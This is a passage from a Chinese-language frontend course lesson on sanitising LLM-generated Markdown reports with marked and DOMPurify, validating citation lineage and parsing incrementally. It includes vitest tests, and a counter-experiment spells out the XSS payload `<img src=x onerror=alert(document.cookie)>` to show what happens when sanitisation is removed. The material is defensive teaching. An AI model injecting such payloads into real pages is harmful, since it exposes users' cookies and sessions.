  it('引用 [3] 没有对应证据 → 拦截', () => {
    const result = validateCitationLineage('结论[3]', [{ index: 1, source: 'tool_call', refId: 't-01' }])
    expect(result.ok).toBe(false)
    if (result.ok) throw new Error('expected error')
    expect(result.error.code).toBe('citation_not_found')
  })

  it('证据表有 [2] 但正文从未引用 → 警告（孤儿证据）', () => {
    const result = validateCitationLineage('结论[1]', [
      { index: 1, source: 'tool_call', refId: 't-01' },
      { index: 2, source: 'metric', refId: 'm-05' },
    ])
    expect(result.ok).toBe(true)
    expect(result.warnings).toContainEqual(expect.objectContaining({ code: 'orphan_evidence' }))
  })
})
```

**3. `incremental/incremental-parser.spec.ts`（3 个用例 —— 增量解析）**

```typescript
import { describe, it, expect } from 'vitest'
import { createIncrementalParser } from './incremental-parser'

describe('incrementalParser', () => {
  it('追加新 block 只解析新增部分', () => {
    const parser = createIncrementalParser()
    const first = parser.push('# 标题\n\n')
    const second = parser.push('段落一\n\n')
    expect(first.newBlocks.length).toBeGreaterThan(0)
    expect(second.newBlocks.length).toBeGreaterThan(0)
    // 第二次 push 不应重新产出标题 block
    expect(second.newBlocks.every((b) => !b.html.includes('<h1'))).toBe(true)
  })

  it('未完成的 block 缓冲不提前 flush', () => {
    const parser = createIncrementalParser()
    const r = parser.push('未完成的段落没有空行')
    expect(r.newBlocks).toHaveLength(0) // 没有 block 边界，缓冲等待
  })

  it('finish() flush 剩余缓冲', () => {
    const parser = createIncrementalParser()
    parser.push('最后一段没有换行')
    const r = parser.finish()
    expect(r.newBlocks.length).toBeGreaterThan(0)
  })
})
```

运行：`pnpm --filter frontend test report` 应 18 个用例全绿。

### 7.7 F-1：反证实验 1（5 分钟）—— 手动去掉 DOMPurify 净化

把 `sanitize-html.ts` 里的 `DOMPurify.sanitize(html, ...)` 改成直接 `return html`，然后在报告里注入 `<img src=x onerror=alert(document.cookie)>`：

- 观察现象：页面弹出 alert 显示 cookie，或控制台看到 CSP 报告 `Refused to execute inline event handler`
- 记录证据：DOM 快照里 `<img>` 带 `onerror` 属性保留；Network 面板出现向外部的可疑请求
- 结论：**没有 DOMPurify，模型输出的任意 HTML 直接在用户浏览器执行**。这就是"证据与 XSS"这一天最核心的保护机制

改回来后重跑测试，确认 12 类语料执行数恢复为 0。

### 7.8 F-2：反证实验 2（5 分钟）—— 手动去掉 citation lineage 校验

把 `useReport.ts` 里的 `validateCitationLineage(...)` 调用注释掉，然后构造一个"正文引用 `[3]` 但证据表只有 `[1][2]`"的报告：

- 观察现象：点击 `[3]` 跳转到 `undefined` 证据卡片，页面显示空白 / 报错 `Cannot read property 'source' of undefined`
- 记录证据：控制台报错栈指向 `citation-resolver.ts`；UI 上 `[3]` 是死链
- 结论：**没有 lineage 校验，模型编造的引用编号会导致"看起来有据可查、实际指向虚空"**，这比无引用更危险（给运维虚假的可信度）

改回来后确认 lineage 校验在渲染前拦截，报告降级为"引用编号异常，已隐藏引用跳转"。

### 7.9 F-3：验证 + 提交（10 分钟）

四件套：

```bash
pnpm --filter frontend typecheck
pnpm --filter frontend lint
pnpm --filter frontend test report
pnpm --filter frontend build
```

四条全绿后提交（Conventional Commits）：

```
feat(report): 诊断报告安全渲染 + 证据链引用（Day16 v3）

- sanitize: marked + DOMPurify 双层净化，URL 协议白名单，12 类 XSS 语料执行数=0
- citation: 引用编号 lineage 校验，[n] 可点击跳转 EvidenceCard，绑定 source+version
- incremental: 流式报告增量解析，30KB 报告单帧解析 < 16ms
- test: sanitize 12 例 + lineage 3 例 + incremental 3 例，共 18 例全绿

Refs: Day16
```

**⚠️ 硬红线：不要 `git push`**。今天的改动只在本地 commit，Day17 结束时集中 push。

---

## 8. 通过标准

- [ ] 12 类 XSS 恶意语料，实际执行的脚本数 = 0（`sanitize-html.spec.ts` 全绿）
- [ ] 每条事实结论后的 `[n]` 可点击跳转到对应真实证据（ToolCall / Metric / Alert）
- [ ] 每条引用绑定 `source` + `version`，运维可验证结论基于哪条真实数据
- [ ] 引用编号错乱（`[3]` 无对应证据）被 lineage 校验在渲染前拦截，不产生死链
- [ ] 30KB 长报告流式渲染时增量解析，单帧解析 < 16ms（Performance 面板无长任务）
- [ ] 前端做二次净化（不信任服务端已净化），纵深防御
- [ ] 四件套（typecheck / lint / test / build）全绿
- [ ] commit 含 `Refs: Day16`，未执行 `git push`

---

## 9. 提交物

1. **代码 commit**：`sanitize/` + `citation/` + `incremental/` + `useReport.ts` + `ReportView.vue` + `EvidenceCard.vue`
2. **测试输出**：`pnpm --filter frontend test report` 的 18 个用例通过截图 / 日志
3. **学习日志**：记录三版演进中"为什么 marked 之后还要 DOMPurify"的理解
4. **架构证据**：Threat Model 文档（12 类攻击面 + 对应防御层），保存到 `docs/security/day16-threat-model.md`
5. **AI Review 记录**：AI 生成的攻击语料 / UI 样式的接受、修改、拒绝理由

---

## 10. 课末 3 个核心问题

1. 请从今天项目的真实入口（模型返回的 Markdown 文本）到最终输出（用户看到的安全报告），解释"证据与 XSS"的数据流；当天知识链"Markdown 安全、XSS、危险 URL、证据链、长内容性能"分别在哪一层起作用，为什么按这个顺序学习？
2. 如果故意移除今天最关键的保护机制（DOMPurify 净化 或 citation lineage 校验），线上会出现什么可观察现象？请给出最小复现、定位证据、恢复动作和一条防复发测试。
3. 请引用今天的具体代码（`sanitize-html.ts` / `citation-lineage.ts`）、测试（18 例）和架构证据（Threat Model），证明项目目标已达到；再说明当前实现距离企业生产标准还缺什么（如 CSP header、Trusted Types），下一步如何演进而不破坏已有合同。

---

## 11. 真实项目情境题（联网更新 2026-07-13）

> 以下是依据当前中国岗位职责和官方技术机制构造的教学模拟，不代表来源企业真实发生过相同事故。题目中的规模和指标是练习约束，不是本项目已经取得的生产数据。

1. 模型输出包含 `<img onerror>`、`javascript:` URL 和伪造引用，预览页面执行脚本并把用户带到钓鱼页。请用 CSP 报告、DOM 快照和引用解析日志定位；先关闭富文本/外链止损，再做 Markdown 白名单、URL 协议校验和 DOM 净化，12 类攻击语料验证执行数为 0。回答必须按"定位证据 -> 临时止损 -> 根因修复 -> 回归验证"组织。
   依据：[S30 OWASP GenAI](https://genai.owasp.org/)
2. 30KB 诊断报告每个 chunk 都全量解析 Markdown，CPU 达 95%，同时引用 [3] 指向错误 ToolCall。请用 Performance profile、解析次数和 citation lineage 定位；先降低渲染频率止损，再增量解析并绑定 source/version，验证长内容 P95 和每条结论可追溯。回答必须按"定位证据 -> 临时止损 -> 根因修复 -> 回归验证"组织。
   依据：[S1 Aime](https://jobs.bytedance.com/experienced/position/7650035429911824693/detail)

知识映射：Markdown/XSS、危险 URL、证据链与长内容性能。

---

## 12. PDF 面试题

> 以下题目引用自公开面经 PDF 汇编，文件名不等于官方题库；用作练习触发点，不代表本项目对齐了任何一家公司的真实校招/社招题库。

1. 大模型返回 Markdown、代码块和公式时，前端用什么方案渲染并保证安全？
   来源：[《2026高德 Al agent 前端开发》](<../../资源/2026高德 Al agent 前端开发.pdf>)，第 6 页。
2. 如何防止 XSS 和 CSRF 攻击？
   来源：[《2024字节前端面试题（45题）》](<../../资源/2024字节前端面试题（45题）.pdf>)，第 12 页。

题目说明：覆盖 Markdown 增量解析、DOMPurify/CSP、危险 HTML/URL 和长内容性能。第一题对应今天的净化管线 + 增量解析，第二题是安全基础追问。

---

## 13. 完成后教师五连问

学生提交 commit、测试输出、学习日志、反证记录和架构证据后，教师依据真实 diff 按"局部机制 -> 边界一致性 -> 线上事故 -> 工程权衡 -> 架构演进"现场提出 5 道问题。五连问不预先固定，也不由上面的 PDF 题替代；评分规则见[《AI 教师五连问验收协议》](../AI教师五连问验收协议.md)。

---

## 14. 本 Day 在 90 天路线中的锚点

- **承接**：Day 15（Agent 时间线：派生状态 + 审计 UI）产出的 raw event 派生视图，今天进一步渲染其中的诊断报告文本
- **本日**：Day 16（证据与 XSS）—— 安全渲染 + 证据链引用，让每条模型结论可追溯到真实证据
- **指向**：
  - Day 17-20（LangChain RAG）：今天的 citation 数据模型（`source` + `version`）直接复用为 RAG 引用溯源的展示层
  - Day 30（M3 门禁）：会要求"任何一条诊断结论都必须能点击引用跳到真实证据"，今天的 lineage 校验是这条门禁的地基
  - Day 61-90（p2-agent-workbench）：多 Agent 协同时，每个 Agent 的输出都要经过今天的净化管线才能进入共享工作区
